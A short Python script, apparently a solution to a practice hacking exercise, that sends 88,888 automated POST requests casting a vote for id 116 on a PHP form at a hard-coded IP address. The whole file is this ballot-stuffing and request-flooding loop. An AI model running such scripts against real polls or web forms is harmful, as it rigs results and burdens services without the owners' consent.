#!/usr/bin/python3
import requests
for i in range(88888):
    form = {'id': '116', 'holdthedoor': 'Submit'}
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post("http://54.221.6.249/level0.php", data=form, headers=header)
